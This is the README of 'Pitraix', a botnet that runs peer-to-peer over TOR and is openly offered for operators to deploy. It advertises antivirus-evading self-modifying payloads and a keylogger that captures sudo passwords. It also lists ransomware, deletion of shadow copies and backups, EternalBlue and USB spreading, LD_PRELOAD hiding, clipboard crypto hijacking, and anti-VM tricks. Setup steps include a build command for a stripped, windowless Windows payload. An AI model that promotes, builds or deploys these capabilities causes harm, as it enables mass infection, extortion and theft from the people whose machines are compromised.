**[English][en]** - [עִברִית][he] - [العربيه][ar] - [русский][ru]

**I am not responsible for any damage you do using this!**

<img src="https://i.ibb.co/nM06FQM/pitraix.png" width=400 height=400></img>
# Pitraix
- Modern Cross-Platform HTTP-Based P2P Botnet over TOR that cannot be traced.

- Design is based off "zero-trust" even malicious peers cannot do any damage while protecting operator identity. [for more information check wiki][wiki]

- Pitraix is able to handle millions of hosts, the limit is TOR network capacity

- You can run Pitraix on a toaster and it will still work just as good with said millions of hosts, as the operative is one who sending requests, not recieving it and because there is no C2.


# Built-in Crypter and self-spreading
- Pitraix has ability to self modify own code which results in a completely different executable in terms of hash on every new infection

- This means security researchers tracking infections via virustotal and similar are much less of a threat.

- It also means that anti viruses cannot detect it!

- All is done automagically and does not need operator intervention.


# Cross-platform with some sneaky 1-days
- Pitraix works on Windows 7 all way to Windows 11 as well as linux

- it has ability to automagically privilege escalate in both platforms

- on Linux it does so by keylogging password when the host uses "sudo" or "doas"

- on Windows it uses a modified version of UACME (work in progress)

- *BSD support is work in progress

# Dynamic Behaviour
- Pitraix automagically chooses different persistence locations on every host as well as names of config file, pitraix name it's self and more are all dynamically generated to confuse anti-viruses


# Anonymous and secure
- Pitraix is coded in Golang which is memory safe, statically linked, and real fast. it's used by important companies such as: Google, Banks, Cloudflare, Discord, etc and uses same libraries used by those companies, thus guaranteed safe code

- Hosts don't know each other. Not even their TOR onion address

- Agents are Hosts that have been given TOR onion addresses of other Hosts, Agents relay instructions from Operative to Hosts. for more techincal information check [spec.txt][specfile]

- Operatives are camaoflagued as agents to protect against advanced network timing and packets attacks over TOR

# Features
- State-of-art encryption using AES-256 and Public-Key cryptography

- Peer-to-Peer over TOR

- Dynamic behaviour

- Built-in crypter

- Built-in RDP over TOR (even works on linux too!)

- Built-in keylogger that only picks interesting things

- Built-in ransomware that never stores keys on HOST (I am not responsible how you use this)

- Auto disable backup like Volume Shadow Copy, OneDrive and Windows Backup

- Auto spreading to USBs, modified version of EternalBlue, and bunch other 1-days (work in progress)

- Auto privilege escalate on Windows and Linux!

- Can hide from ALL system monitoring tools on Linux! (uses LD_PRELOAD)

- Ability to hijack crypto addresses in clipboard

- Readiable code easy to modify, not alot of scattered files

- Colorful terminal-based interface for operatives

- ZERO read/write to registry, thus lower detection

- Time-based Anti-Debugging detection

- Advanced VM detection

- Extremely low system and internet requirements

- Ability to capture Events. Events are anything interesting that happens on a host computer, currently it's tied only to keylogger

- Ability to capture Logs. Logs are mainly used for debugging behaviour and errors

Picture of working OPER

<img src="https://i.ibb.co/RCBW7NG/image.png"></img>


# Trust
- For my GPG key please check [gpg.asc][gpgfile]

- Anyone who claims to be me and don't haven't signed a message with that key is NOT me


# Support
- This project is developed entirely by me in my free time, if you'd like to support me to keep updating, best way is via donating.

- Monero: `85HjZpxZngajAEy2123NuXgu1PnNyq2DLSkkr93cyT8QQVae1GruhL4hHAtnaFqeCF7Vo9eW2P11Sig8DDqzVzCSE95NaW6`

- Bitcoin (segwit): `bc1q2dqk9u06vv2j5p6yptj9ex7epfv77sxjygnrnw` 

# Setting it up
- Download latest Go version for your platform
- Download files from releases and make sure they are all in same folder
- Compile lyst for platform you want
- Compile OPER (do NOT `go run OPER.go`! instead compile it THEN run the executable
- After running OPER for first time, it should automagically generate and embed RSA keys and TOR addresses into lyst executable
- OPER will automagically set up TOR. Make sure you don't already have a hidden service running on your device.

- Example for a stripped, windowless lyst payload for windows: `GOOS=windows go build -ldflags="-s -w -H=windowsgui" lyst_windows.go`

For more examples check [wiki][wiki]

# Help
- Type "help" in OPER for list of commands


# Techincal
- Please make sure you read [spec.txt][specfile] for more techincal information
- If it's little bit slow it's due TOR network, TOR network is expected to be upgraded soon and thus speed should be greatly improved then
- TOR binary from Torproject (which Pitraix uses) is signed and thus does not affect detection rate negatively 

# Future & Terms definition
- Please read [spec.txt][specfile] for list of terms and their respective meaning alongside tons of useful information for anybody even thinking of editing source code

[en]: https://github.com/ThrillQuks/Pitraix#readme
[he]: README.he.md
[ar]: README.ar.md
[ru]: README.ru.md
[gpgfile]: https://raw.githubusercontent.com/ThrillQuks/Pitraix/main/gpg.asc
[specfile]: pitraix/spec.txt
[wiki]: https://github.com/ThrillQuks/Pitraix/wiki
